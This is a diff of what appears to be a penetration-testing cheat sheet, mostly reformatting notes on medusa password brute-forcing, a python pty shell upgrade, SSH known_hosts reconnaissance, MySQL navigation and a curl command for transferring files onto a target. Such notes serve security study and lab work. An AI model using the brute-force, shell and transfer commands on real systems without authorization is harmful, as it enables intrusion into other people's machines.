@@ -8,27 +8,27 @@ Windows & *nix:
 <p> - medusa -h [ip] -U [users.txt] -P [passwords.txt] -M [module] [ip] 
 
 
-upgrade shell using python pty library and adds auto complete for steps 2+ :
-1 - python -c 'import pty;pty.spawn("/bin/bash")'
-2 - CTRL z
-3 - stty raw -echo
-4 - fg <enter key>
-5 - export TERM=xterm
+<p> upgrade shell using python pty library and adds auto complete for steps 2+ :
+<p> 1 - python -c 'import pty;pty.spawn("/bin/bash")'
+<p> 2 - CTRL z
+<p> 3 - stty raw -echo
+<p> 4 - fg <enter key>
+<p> 5 - export TERM=xterm
 
-known hosts ssh file will show all hosts the host has SSH'd into
+<p> known hosts ssh file will show all hosts the host has SSH'd into
 
-- command to reset a broke terminal session
-reset
+<p> - command to reset a broke terminal session
+<p> reset
 
-- mysql syntax for navigation:
-show databases; (shows available databases)
-use <database name>; (selects database to use)
-show tables; (shows tables in database)
-describe <table name>; (shows more information on values inside table)
-select <table value> from <table>; (shows items inside the table values of the table)
+<p> - mysql syntax for navigation:
+<p> show databases; (shows available databases)
+<p> use [database name]; (selects database to use)
+<p> show tables; (shows tables in database)
+<p> describe [table name]; (shows more information on values inside table)
+<p> select [table value] from [table]; (shows items inside the table values of the table)
   
-- file upload:
-curl http://<ip>:<port>/<file> -output <file>    (works with powershell and linux)
+<p> - file upload (works with powershell and linux):
+<p> curl http://[ip]:[port]/[file] -output [file]
 
 
 
